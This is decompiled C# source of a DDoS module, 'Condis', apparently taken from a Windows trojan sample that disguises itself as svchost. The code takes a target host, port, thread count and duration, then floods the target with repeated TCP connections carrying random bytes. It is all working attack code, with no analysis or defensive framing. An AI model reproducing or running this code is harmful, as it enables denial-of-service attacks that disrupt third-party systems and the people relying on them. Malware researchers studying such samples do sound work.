// Decompiled with JetBrains decompiler
// Type: svchost.DDOS.Condis
// Assembly: svchost, Version=10.0.18362.1, Culture=neutral, PublicKeyToken=null
// MVID: 64EF29CB-BBE3-43C5-8FBF-9660E67757C5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-b33d569af5e490875d6473c6402797ddb4ce639bb1f1cf7f67698eeafa625f09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace svchost.DDOS
{
  [StandardModule]
  [OptionText]
  public sealed class Condis
  {
    private static object ThreadsEnded = (object) 0;
    private static string HostToAttack;
    private static int TimetoAttack;
    private static int ThreadstoUse;
    private static int Port;
    private static Thread[] Threads;
    private static bool AttackRunning = false;
    private static int attacks = 0;

    public static void StartCondis(string Host, int Threadsto, int Time, int Ports)
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 1;
label_1:
        int num3 = 2;
        if (Condis.AttackRunning)
          goto label_14;
label_2:
        num3 = 3;
        Condis.AttackRunning = true;
label_3:
        num3 = 4;
        Condis.HostToAttack = Host;
label_4:
        num3 = 5;
        Condis.Port = Ports;
label_5:
        num3 = 6;
        Condis.ThreadstoUse = Threadsto;
label_6:
        num3 = 7;
        Condis.TimetoAttack = Time;
label_7:
        num3 = 8;
        Condis.Threads = new Thread[checked (Threadsto - 1 + 1)];
label_8:
        num3 = 9;
        int num4 = checked (Threadsto - 1);
        int index = 0;
        goto label_13;
label_9:
        num3 = 10;
        Condis.Threads[index] = new Thread(new ThreadStart(Condis.DoWork));
label_10:
        num3 = 11;
        Condis.Threads[index].IsBackground = true;
label_11:
        num3 = 12;
        Condis.Threads[index].Start();
label_12:
        num3 = 13;
        checked { ++index; }
label_13:
        if (index <= num4)
          goto label_9;
        else
          goto label_21;
label_14:
        goto label_21;
label_16:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
              case 16:
              case 17:
                goto label_21;
              case 15:
                goto label_14;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_16;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_21:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    private static void lol()
    {
      Condis.ThreadsEnded = Operators.AddObject(Condis.ThreadsEnded, (object) 1);
      if (!Operators.ConditionalCompareObjectEqual(Condis.ThreadsEnded, (object) Condis.ThreadstoUse, true))
        return;
      Condis.ThreadsEnded = (object) 0;
      Condis.ThreadstoUse = 0;
      Condis.AttackRunning = false;
      Condis.attacks = 0;
    }

    public static void StopCondis()
    {
      if (!Condis.AttackRunning)
        return;
      int num = checked (Condis.ThreadstoUse - 1);
      int index = 0;
      while (index <= num)
      {
        try
        {
          Condis.Threads[index].Abort();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        checked { ++index; }
      }
      Condis.AttackRunning = false;
      Condis.attacks = 0;
    }

    private static void DoWork()
    {
      try
      {
        TimeSpan timeSpan = TimeSpan.FromSeconds((double) Condis.TimetoAttack);
        Stopwatch stopwatch = Stopwatch.StartNew();
        IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(Dns.GetHostAddresses(Condis.HostToAttack)[0].ToString()), Condis.Port);
        while (stopwatch.Elapsed < timeSpan)
        {
          try
          {
            Random random = new Random();
            byte[] buffer = new byte[100];
            int index = 0;
            do
            {
              buffer[index] = checked ((byte) random.Next(0, 100));
              checked { ++index; }
            }
            while (index <= 99);
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            socket.Connect((EndPoint) remoteEP);
            socket.SendTo(buffer, (EndPoint) remoteEP);
            checked { ++Condis.attacks; }
            socket.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      Condis.lol();
    }
  }
}
